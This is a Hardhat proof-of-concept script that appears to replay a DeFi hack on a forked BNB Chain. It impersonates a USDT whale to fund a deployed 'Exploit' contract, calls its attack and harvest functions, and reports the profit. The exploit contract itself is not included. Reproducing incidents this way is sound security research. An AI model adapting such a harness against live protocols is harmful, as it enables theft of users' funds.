const { ethers } = require("hardhat");
const hre = require("hardhat");

const UsdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const UsdtHolder = '0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83';

async function main() {
  let Exploit = await hre.ethers.getContractFactory("Exploit");
  const exp = await Exploit.deploy();
  await exp.deployed();
  console.log("Exploit contract deployed to:", exp.address);

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [UsdtHolder],
  });
  const signer = await hre.ethers.getSigner(UsdtHolder)
  const USDT = await hre.ethers.getContractAt("IERC20", UsdtAddress, signer);
  
  let amount = '500000'
  await USDT.transfer(exp.address, ethers.utils.parseEther(amount));
  console.log('Assuming that the hacker has %sU.', amount);

  let before = await USDT.balanceOf(exp.address);
  await exp.attack();
  await exp.harvest();
  let after = await USDT.balanceOf(exp.address);
  console.log("Profit: %d $USDT", parseInt(ethers.utils.formatEther(after.sub(before))));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
